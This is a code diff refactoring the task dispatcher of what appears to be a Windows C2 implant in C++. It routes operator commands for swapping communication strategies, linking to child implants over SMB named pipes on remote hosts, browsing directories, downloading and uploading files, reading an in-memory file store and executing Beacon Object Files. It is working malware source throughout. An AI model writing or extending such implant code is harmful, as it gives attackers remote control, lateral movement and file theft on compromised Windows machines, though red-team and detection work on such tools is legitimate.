@@ -1,24 +1,4 @@
-/*
-
-Command tree
-
-
-...
-results methodology:
-
-message: A message for the operator. This is either a direct output from windows `FormatMessageA`, or something else if not using windows api.
-data: This holds the data output of the action. Ex, `ls`, data will hold the file list. 
-    > note, more specific fields may be included, such as `comms_get_strategy`, and `comms_post_strategy`, when multiple fields are needed.
-    > These should be documented (somewhere...) by me eventually. By default, the GUI spits all response fields out into the terminal.
-
-windows_error_code: A windows error code to always include (even 0, on success). Helfpul for knowing whaat went wrong/passing through
-errors without relying on addtl branch logic. I try to use windows error  macro defs where possible (ex, ERROR_SUCCESS).
-    
-*/
-
-
 #include "protocols/json/json.h"
-#include <iostream>
 #include "modules/cd.h"
 #include "modules/ls.h"
 #include "modules/files.h"
@@ -27,16 +7,13 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "settings.h"
 #include "data/structs.h"
 #include "systems/memstore.h"
-#include <string_view>
 #include <windows.h>
 #include <string>
 #include "systems/childhandler.h"
 #include "comms/queues.h"
-#include "core/c2.h"
 #include "protocols/smb/smb.h"
 #include "_debug/debug.h"
 #include "defense/winapi.h"
-//move to own file?
 
 /**
  * @brief Get the Error Message from a windows error code
@@ -159,31 +136,18 @@ nlohmann::json command_tree(nlohmann::json task_data) {
     }
     DEBUG_LOG("[command_tree]: " << task_name);
 
-    /*
-    Strat commands
-    */
     if (task_name == "strat set get") {
         nlohmann::json result;
         std::string target_strat = task_data["task"]["args"]["strategy_name"];
 
-        auto allowed_strats = SettingsManager::instance().get<std::vector<std::string>>("comms_get_strats", {});
-
-        bool found = false;
-        for (const auto& strat : allowed_strats) {
-            if (strat == target_strat) {
-                found = true; 
-                break;
-            }
-        }
-
-        if (found) {
+        if (IsStrategyValid(target_strat, "comms_get_strats")) {
             SettingsManager::instance().set("comms_get_function", target_strat);
             result["data"] = "Ingress strategy successfully updated to: " + target_strat;
-            result["windows_error_code"] = 0; // ERROR_SUCCESS
+            result["windows_error_code"] = ERROR_SUCCESS;
         }
         else {
             result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
-            result["windows_error_code"] = 2; // ERROR_FILE_NOT_FOUND
+            result["windows_error_code"] = ERROR_FILE_NOT_FOUND;
         }
 
         result["message"] = GetErrorMessage(result["windows_error_code"]);
@@ -194,24 +158,14 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         nlohmann::json result;
         std::string target_strat = task_data["task"]["args"]["strategy_name"];
 
-        auto allowed_strats = SettingsManager::instance().get<std::vector<std::string>>("comms_post_strats", {});
-
-        bool found = false;
-        for (const auto& strat : allowed_strats) {
-            if (strat == target_strat) {
-                found = true; 
-                break;
-            }
-        }
-
-        if (found) {
+        if (IsStrategyValid(target_strat, "comms_post_strats")) {
             SettingsManager::instance().set("comms_post_function", target_strat);
             result["data"] = "Egress strategy successfully updated to: " + target_strat;
-            result["windows_error_code"] = 0;
+            result["windows_error_code"] = ERROR_SUCCESS;
         }
         else {
             result["data"] = "Error: Strategy '" + target_strat + "' not found. Run 'strat list' to see valid options.";
-            result["windows_error_code"] = 2;
+            result["windows_error_code"] = ERROR_FILE_NOT_FOUND;
         }
 
         result["message"] = GetErrorMessage(result["windows_error_code"]);
@@ -311,68 +265,36 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         return result;
     }
 
-    /*
-    Link commands
-    */
     else if (task_name == "link smb") {
-        //update link class with info we need
-
         nlohmann::json result;
 
-        //make sure all of our args are present
         auto& args = task_data["task"]["args"];
         if (!args.contains("target") || !args["target"].is_string()) {
             result["error"] = "Task failed: 'target' is missing or not a string";
             return result;
         }
-
         if (!args.contains("protocol") || !args["protocol"].is_string()) {
             result["error"] = "Task failed: 'protocol' is missing or not a string";
             return result;
         }
-
         if (!args.contains("inbox_pipe") || !args["inbox_pipe"].is_string()) {
             result["error"] = "Task failed: 'inbox_pipe' is missing or not a string";
             return result;
         }
-
         if (!args.contains("outbox_pipe") || !args["outbox_pipe"].is_string()) {
             result["error"] = "Task failed: 'outbox_pipe' is missing or not a string";
             return result;
         }
 
-        //host we connect to
-        if (!args.contains("target") || !args["target"].is_string()) {
-            result["error"] = "Task failed: 'target' is missing or not a string";
-            return result;
-        }
-
-        //setup our struct for the childhandler class
-        ChildRouteInfo cri;
-        //cri.target_uuid = args["child_uuid"];
-
-        // Map the protocol string to our internal Enum
         std::string protocol = args["protocol"];
-        if (protocol == "smb" || protocol == "pipe") {
-            cri.route_type = ROUTE_SMB_PIPE;
-        }
-        //else if (protocol == "tcp") { //not implemented yet
-        //    cri.route_type = ROUTE_TCP_SOCKET; 
-        //}
-        else {
+        if (protocol != "smb" && protocol != "pipe") {
             result["error"] = "Task failed: Unknown protocol '" + protocol + "'.";
             return result;
         }
 
-        // Format the pipe names and convert std::string to std::wstring
-        // Assuming the operator just passes "inbox2", we prepend the Windows pipe path format.
-        //kinda fragile, should probably think about how to take bad pipe name input here
-        //std::string raw_inbox = "\\\\.\\pipe\\" + args["inbox_pipe"].get<std::string>();
-        //std::string raw_outbox = "\\\\.\\pipe\\" + args["outbox_pipe"].get<std::string>();
+        ChildRouteInfo cri;
+        cri.route_type = ROUTE_SMB_PIPE;
 
-        //note - this should be updated to use the strat name of the pipes instead of what is passed in
-        //or, server can track this. decision for later. 
-        //this is parent side
         std::string target_host = args["target"];
         std::string raw_inbox = "\\\\" + target_host + "\\pipe\\" + args["inbox_pipe"].get<std::string>();
         std::string raw_outbox = "\\\\" + target_host + "\\pipe\\" + args["outbox_pipe"].get<std::string>();
@@ -381,107 +303,82 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         cri.pipe_outbox = std::wstring(raw_outbox.begin(), raw_outbox.end());
         cri.host_address = target_host;
 
-        //poking child
-        if (cri.route_type == ROUTE_SMB_PIPE) {
-            DEBUG_LOG("Waiting for connection from child");
-
-            //wait and connect to inbox
-            DEBUG_LOG("Waiting for INBOX pipe to become available...");
-            if (!WinApi::WaitNamedPipeW(cri.pipe_inbox.c_str(), 5000)) {
-                result["error"] = "Timeout waiting for INBOX pipe. Child might be dead or busy.";
-                return result;
-            }
-            HANDLE h_parent_write = WinApi::CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-            if (h_parent_write == INVALID_HANDLE_VALUE) {
-                result["error"] = "Failed to open INBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
-                return result;
-            }
-
-            // wait & connect to outbox
-            DEBUG_LOG("INBOX connected. Waiting for OUTBOX pipe to become available...");
-            if (!WinApi::WaitNamedPipeW(cri.pipe_outbox.c_str(), 5000)) {
-                WinApi::CloseHandle(h_parent_write); 
-                result["error"] = "Timeout waiting for OUTBOX pipe. Child dropped connection.";
-                return result;
-            }
-            HANDLE h_parent_read = WinApi::CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
-            if (h_parent_read == INVALID_HANDLE_VALUE) {
-                WinApi::CloseHandle(h_parent_write);
-                result["error"] = "Failed to open OUTBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
-                return result;
-            }
-
-            if (h_parent_write != INVALID_HANDLE_VALUE && h_parent_read != INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("Pipes connected. Waiting for child to check in...");
-                cri.h_pipe_inbox = h_parent_write;
-                cri.h_pipe_outbox = h_parent_read;
-
-                // CRITICAL: Force the read handle into Message Mode so MsgPack doesn't fragment
-                DWORD mode = PIPE_READMODE_MESSAGE;
-                if (!WinApi::SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
-                    std::cerr << "Failed to set pipe to message mode. Error: " << GetLastError() << std::endl;
-                }
-
-                // Use our new dynamic reader!
-                std::vector<uint8_t> request_bytes;
-                DWORD read_status = SMB::read_pipe_dynamic(cri.h_pipe_outbox, request_bytes);
-
-                if (read_status != ERROR_SUCCESS || request_bytes.empty()) {
-                    DEBUG_LOG("Pipe broke or child disconnected. Error: " << read_status);
-                    result["error"] = "Pipe broke or child disconnected";
-                    return result;
-                }
-
-                try {
-                    // It is an ARRAY!
-                    nlohmann::json child_request_array = nlohmann::json::from_msgpack(request_bytes);
-
-                    if (!child_request_array.is_array() || child_request_array.empty()) {
-                        throw std::runtime_error("Child sent empty or invalid array format.");
-                    }
-
-                    // Grab the actual check-in object from the array
-                    nlohmann::json child_request = child_request_array[0];
-                    std::string child_uuid = child_request["implant_uuid"];
-
-                    // Add uuid to cri and register to child handler
-                    cri.child_uuid = child_uuid;
-                    ChildHandler::instance().add_child(child_uuid, cri);
-
-                    // Push the whole array to the GET queue
-                    //GetQueue::push(child_request_array);
-                    //take all items from child (should just be metadata) and send them back up
-                    for (const auto& item : child_request_array) {
-                        GetQueue::push(item);
-                    }
-
-                    // Immediatly feed it a nothingburger task to "reset" it back to sending a GET
-                    nlohmann::json task_list = nlohmann::json::array();
-                    std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);
-
-                    DWORD bytes_written = 0;
-                    WinApi::WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
-
-                }
-                catch (const std::exception& e) {
-                    std::cerr << "Exception during link: " << e.what() << std::endl;
-                    result["error"] = "Something went wrong linking to the implant";
-                    return result;
-                }
-            }
-            else {
-                //for invliad handels, i.e. bad perms, etc.
-                int windows_error_code = WinApi::GetLastError();
-                result["message"] = GetErrorMessage(windows_error_code);
-                result["windows_error_code"] = windows_error_code;
-                return result;
-            }
-            // Return success back to the C2 server
-            result["data"]["child_uuid"] = cri.child_uuid;
-            result["message"] = "Successfully linked to child implant " + protocol + ".";
-            result["windows_error_code"] = 0; // ERROR_SUCCESS
+        DEBUG_LOG("Waiting for INBOX pipe to become available...");
+        if (!WinApi::WaitNamedPipeW(cri.pipe_inbox.c_str(), 5000)) {
+            result["error"] = "Timeout waiting for INBOX pipe. Child might be dead or busy.";
             return result;
         }
+        HANDLE h_parent_write = WinApi::CreateFileW(cri.pipe_inbox.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (h_parent_write == INVALID_HANDLE_VALUE) {
+            result["error"] = "Failed to open INBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
+            return result;
+        }
+
+        DEBUG_LOG("INBOX connected. Waiting for OUTBOX pipe to become available...");
+        if (!WinApi::WaitNamedPipeW(cri.pipe_outbox.c_str(), 5000)) {
+            WinApi::CloseHandle(h_parent_write);
+            result["error"] = "Timeout waiting for OUTBOX pipe. Child dropped connection.";
+            return result;
+        }
+        HANDLE h_parent_read = WinApi::CreateFileW(cri.pipe_outbox.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (h_parent_read == INVALID_HANDLE_VALUE) {
+            WinApi::CloseHandle(h_parent_write);
+            result["error"] = "Failed to open OUTBOX pipe. Error: " + std::to_string(WinApi::GetLastError());
+            return result;
+        }
+
+        DEBUG_LOG("Pipes connected. Waiting for child to check in...");
+        cri.h_pipe_inbox = h_parent_write;
+        cri.h_pipe_outbox = h_parent_read;
+
+        DWORD mode = PIPE_READMODE_MESSAGE;
+        if (!WinApi::SetNamedPipeHandleState(cri.h_pipe_outbox, &mode, NULL, NULL)) {
+            DEBUG_LOG("Failed to set pipe to message mode. Error: " << WinApi::GetLastError());
+        }
+
+        std::vector<uint8_t> request_bytes;
+        DWORD read_status = SMB::read_pipe_dynamic(cri.h_pipe_outbox, request_bytes);
+
+        if (read_status != ERROR_SUCCESS || request_bytes.empty()) {
+            DEBUG_LOG("Pipe broke or child disconnected. Error: " << read_status);
+            result["error"] = "Pipe broke or child disconnected";
+            return result;
+        }
+
+        try {
+            nlohmann::json child_request_array = nlohmann::json::from_msgpack(request_bytes);
+
+            if (!child_request_array.is_array() || child_request_array.empty()) {
+                result["error"] = "Child sent empty or invalid array format.";
+                return result;
+            }
+
+            nlohmann::json child_request = child_request_array[0];
+            std::string child_uuid = child_request["implant_uuid"];
+
+            cri.child_uuid = child_uuid;
+            ChildHandler::instance().add_child(child_uuid, cri);
+
+            for (const auto& item : child_request_array) {
+                GetQueue::push(item);
+            }
+
+            nlohmann::json task_list = nlohmann::json::array();
+            std::vector<uint8_t> msgpack_payload = nlohmann::json::to_msgpack(task_list);
+
+            DWORD bytes_written = 0;
+            WinApi::WriteFile(cri.h_pipe_inbox, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL);
+        }
+        catch (const std::exception& e) {
+            DEBUG_LOG("Exception during link: " << e.what());
+            result["error"] = "Something went wrong linking to the implant";
+            return result;
+        }
+
+        result["data"]["child_uuid"] = cri.child_uuid;
+        result["message"] = "Successfully linked to child implant " + protocol + ".";
+        result["windows_error_code"] = ERROR_SUCCESS;
+        return result;
     }
     else if (task_name == "unlink smb") {
         nlohmann::json result;
@@ -575,12 +472,10 @@ nlohmann::json command_tree(nlohmann::json task_data) {
             return result;
         }
 
-        std::string memstore_file_to_download = task_data["task"]["args"]["file_name"];
-
+        std::string memstore_file_to_download = args["file_name"];
         std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);
 
-        //add_bytes_result(result, "data", memstore_file_bytes);
-        result["data"] = "";
+        result["data"] = nlohmann::json::binary(memstore_file_bytes);
         result["windows_error_code"] = ERROR_SUCCESS;
         result["message"] = GetErrorMessage(ERROR_SUCCESS);
         return result;
@@ -623,167 +518,104 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         std::vector<std::string> file_names = MemStore::instance().get_file_names();
 
         std::string output;
-        for (std::string file_name : file_names) {
-            output += file_name;
-            output += "\n";
+        for (const auto& file_name : file_names) {
+            output += file_name + "\n";
         }
-
-        //DEBUG_LOG(output);
-
-        //add_text_result(result, "data", output);
-        //hardcode response, memstore does not have same return values as modules,  as it's not a module
 
         result["windows_error_code"] = ERROR_SUCCESS;
         result["message"] = GetErrorMessage(ERROR_SUCCESS);
         result["data"] = output;
-
         return result;
     }
-    /*
-    Modules
-    Note: return values are directly pulled from modules, message, data and windows_error_code
-    */
     else if (task_name == "ls") {
         nlohmann::json result;
-        //get args, which are named compontents in the task->args block of the task_data
         std::string directory_to_list = task_data["task"]["args"]["directory"];
-        //do a validation here
 
-        //If for whatever reason, there is a blank directory, fallback to current directory. This is checked on the Client as well,but an "ls" may slip through without a dir on via the API.
         if (directory_to_list.empty()) {
-            directory_to_list = "."; //set to current dir if no directory is provided
+            directory_to_list = ".";
         }
 
         ModuleResult module_result = ls(directory_to_list);
-        //std::string files_list = module_result.data;
-        DWORD windows_error_code = module_result.windows_error_code;
 
-
-        result["windows_error_code"] = windows_error_code;
-        result["message"] = GetErrorMessage(windows_error_code);
+        result["windows_error_code"] = module_result.windows_error_code;
+        result["message"] = GetErrorMessage(module_result.windows_error_code);
         result["data"] = module_result.data;
-
-
         return result;
     }
     else if (task_name == "cd") {
-        //std::string temp_path = "C:\\";
-
-        //get args, which are named compontents in the task->args block of the task_data
-        std::string directory_to_traverse_to = task_data["task"]["args"]["directory"];
-        //do a validation here
-        
-        //setup json object to return. This will be plugged into the result. 
         nlohmann::json result;
-
+        std::string directory_to_traverse_to = task_data["task"]["args"]["directory"];
 
         ModuleResult module_result = cd(directory_to_traverse_to);
-        std::string data = module_result.data;
-        DWORD windows_error_code = module_result.windows_error_code;
 
-        result["windows_error_code"] = windows_error_code;
-        result["message"] = GetErrorMessage(windows_error_code);
+        result["windows_error_code"] = module_result.windows_error_code;
+        result["message"] = GetErrorMessage(module_result.windows_error_code);
         result["data"] = module_result.data;
         return result;
-
     }
     else if (task_name == "file download") {
         nlohmann::json result;
 
-        //check for correct values
         auto& args = task_data["task"]["args"];
         if (!args.contains("file_path") || !args["file_path"].is_string()) {
             result["error"] = "Task failed: 'file_path' is missing or not a string.";
             return result;
         }
 
-        //get file path from command
-        std::string file_path = task_data["task"]["args"]["file_path"];
-
-        //std::string file_contents = get_file(file_path);
+        std::string file_path = args["file_path"];
         ModuleResult module_result = get_file(file_path);
-        std::string file_contents = module_result.data;
-        DWORD windows_error_code = module_result.windows_error_code;
 
-        if (file_contents.empty()) {
-            result["windows_error_code"] = windows_error_code;
-            result["message"] = "The file appears to be empty";
-            return result;
-
-        }
-
-        result["windows_error_code"] = windows_error_code;
-        result["message"] = GetErrorMessage(windows_error_code);
+        result["windows_error_code"] = module_result.windows_error_code;
+        result["message"] = GetErrorMessage(module_result.windows_error_code);
         result["data"] = module_result.data;
-
         return result;
     }
     else if (task_name == "file upload") {
         nlohmann::json result;
 
-        //check for correct values
         auto& args = task_data["task"]["args"];
-
-        // 1. Validate Inputs
         if (!args.contains("file_path") || !args.contains("file_contents")) {
-            throw std::runtime_error("Missing required arguments: file_path or file_contents");
+            result["error"] = "Missing required arguments: file_path or file_contents";
+            return result;
         }
 
-        // Extract Data 
         std::string file_path = args["file_path"];
         std::vector<uint8_t> file_bytes = determine_if_argument_is_data_or_memstore_pointer(args["file_contents"]);
 
-        // sanity check to make sure that the vector is not empty.
         if (file_bytes.empty()) {
-            result["error"] = "File content was empty(or invalid pointer).Wrote 0 bytes.";
+            result["error"] = "File content was empty (or invalid pointer). Wrote 0 bytes.";
             return result;
         }
 
         ModuleResult module_result = put_file(file_bytes, file_path);
-        std::string data = module_result.data;
-        DWORD windows_error_code = module_result.windows_error_code;
 
-        result["windows_error_code"] = windows_error_code;
-        result["message"] = GetErrorMessage(windows_error_code);
+        result["windows_error_code"] = module_result.windows_error_code;
+        result["message"] = GetErrorMessage(module_result.windows_error_code);
         result["data"] = module_result.data;
-
-
         return result;
     }
     else if (task_name == "bof") {
         nlohmann::json result;
 
-        //check for correct values
         auto& args = task_data["task"]["args"];
-
-        // Validate Inputs
         if (!args.contains("bof_contents") || !args.contains("bof_args")) {
-            //throw std::runtime_error("Missing required arguments: bof_contents, bof_args");
             result["error"] = "Missing bof_contents or bof_args";
-
             return result;
         }
 
-        // Extract Data 
         std::string bof_args = args["bof_args"];
         std::vector<uint8_t> bof_bytes = determine_if_argument_is_data_or_memstore_pointer(args["bof_contents"]);
 
-        // sanity check to make sure that the vector is not empty.
         if (bof_bytes.empty()) {
             result["error"] = "bof content was empty (or invalid pointer)";
-
             return result;
         }
 
         ModuleResult module_result = run_bof(bof_bytes, bof_args);
-        std::string data = module_result.data;
-        DWORD windows_error_code = module_result.windows_error_code;
 
-        result["windows_error_code"] = windows_error_code;
-        result["message"] = GetErrorMessage(windows_error_code);
+        result["windows_error_code"] = module_result.windows_error_code;
+        result["message"] = GetErrorMessage(module_result.windows_error_code);
         result["data"] = module_result.data;
-
-
         return result;
     }
     else {
@@ -791,8 +623,6 @@ nlohmann::json command_tree(nlohmann::json task_data) {
         result["data"] = "";
         result["windows_error_code"] = ERROR_INVALID_PARAMETER;
         result["message"] = GetErrorMessage(ERROR_INVALID_PARAMETER);
-
         return result;
     }
-
 }
